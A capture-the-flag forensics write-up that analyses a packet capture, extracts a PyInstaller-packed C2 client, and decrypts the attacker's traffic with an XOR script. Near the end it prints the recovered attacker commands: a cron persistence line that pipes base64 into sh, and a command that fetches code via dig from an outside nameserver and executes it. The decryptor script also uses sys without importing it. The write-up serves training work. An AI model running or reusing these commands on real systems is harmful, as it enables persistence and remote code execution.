> This [room](https://tryhackme.com/r/room/seetworoom) is focused on digital forensics, we are given a packet capture file that we should investigate in order to analyze the suspicious behavior.

## Start of the investigation

Once we unzipped the evidence file, we can take a brief look at the pcap file, we mainly see some SSH traffic which is encrypted but a **HTTP GET** on a file called `/base64_client` :

![basefile](/assets/img/tryhackme/ctf/seetwo/1.png)

Thanks to **Wireshark**, we can export the HTTP object (so the `base64_client` file) by going to `File > Export Objects > HTTP` and then selecting our file.

![httpobject](/assets/img/tryhackme/ctf/seetwo/2.png)

Once we saved it, we can decode it to obtain the original file.

```shell
base64 -d base64_client > decodedfile
```

By using the `file` command, we see that this file is an **ELF binary** :

```shell
$ file decodedfile
decodedfile: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7714ff204a07dc0d042276bab94a99badd4276f0, for GNU/Linux 2.6.32, stripped
```

## Reverse the binary

Using the `strings` command, we can extract all the strings contained in the binary and we see different interesting parts :

![strings1](/assets/img/tryhackme/ctf/seetwo/5.png)

![strings2](/assets/img/tryhackme/ctf/seetwo/6.png)

At first, I did not see what I could figure out with those strings (and importing the file into Ghidra did not help much more) so I tried to find any key words that could catch my eye.

According to the strings, **PyInstaller** (which is a program that bundles a Python application and all its dependencies into a single package) tried to open some file.

As we know its use, we can search for any tools that could help us extract what is containing the **decodedfile**. After a brief search on Google, we find a web tool called [pyinstxtractor](https://pyinstxtractor-web.netlify.app/) that we use to extract the files that will help us in order to investigate the behavior of the python program.

The tool has done its job well and even tells us that we got two entry points being `pyiboot01_bootstrap.pyc` and `client.pyc` (the second one sounds more appealing).

So we will use **uncompyle6** to uncompile it and retrieve the original `.py` file.

```shell
$ uncompyle6 -o . client.pyc
client.pyc --
Successfully decompiled file
```

Great! Now we can take a look at it!

![client](/assets/img/tryhackme/ctf/seetwo/9.png)

It seems like this file is a script used to create a **C2 channel** on the target machine. It connects to the machine with the IP **10.0.2.64** on port **1337**, decodes and decrypts the received command, executes it and retrieves the output, then encodes and encrypts the results to send it back to the C2 server.

## Decrypt the data

Hence, we could use this code and the hardcoded **key** to decrypt some messages sent by (and to) the C2 server.

Looking at the traffic on **Wireshark**, there is indeed some communication between those two machines, sent to port **1337** :

![wireshark](/assets/img/tryhackme/ctf/seetwo/10.png)

Using chatGPT, we create a python script that will be used to decrypt the data, here it is :

```python
import base64

# Function to perform XOR decryption
def xor_crypt(data, key):
    key_length = len(key)
    decrypted_data = []
    for i, byte in enumerate(data):
        decrypted_byte = byte ^ key[i % key_length]
        decrypted_data.append(decrypted_byte)
    return bytes(decrypted_data)

# Define the key (must match the key used for encryption)
key = "[REDACTED]".encode("utf-8") 

# Replace this with the intercepted Base64-encoded encrypted data
captured_data = "YOUR_CAPTURED_DATA"

# Step 1: Split the intercepted data using the separator
parts = captured_data.split("AAAAAAAAAA")
if len(parts) != 2:
    print("Invalid data format. Check the separator and data.")
    sys.exit(1)

# Step 2: Decode the Base64 data for the encrypted result
try:
    encrypted_result = base64.b64decode(parts[1])
except Exception as e:
    print(f"Error decoding Base64: {e}")
    sys.exit(1)

# Step 3: Decrypt the result using XOR
decrypted_result = xor_crypt(encrypted_result, key)

# Step 4: Print the decrypted result
print("Decrypted Data:", decrypted_result)
```

Then, using Wireshark's `Follow TCP Stream` option, we can easily distinguish the data sent and copy it into our script to decrypt it.

![tcpstream](/assets/img/tryhackme/ctf/seetwo/11.png)

When we write the data from Wireshark and execute the script, it shows us what commands the attacker used on the target machine through this C2 channel :

```shell
$ python3 decryptor.py
Decrypted Data: b'id'
```
We can do the same for the rest of the data, answer the different questions and then find the flag.

```shell
$ python3 decryptor.py
Decrypted Data: b'* * * * * echo L2Jpbi9za[REDACTED]bGR9LnRobSki | base64 | sh\n'

$ echo "L2Jpbi9za[REDACTED]bGR9LnRobSki" > flag.txt

$ base64 -d flag.txt                                                                        
/bin/sh -c "sh -c $(dig [...] @ns.THM{FLAG}.thm)"#                                                                 
```
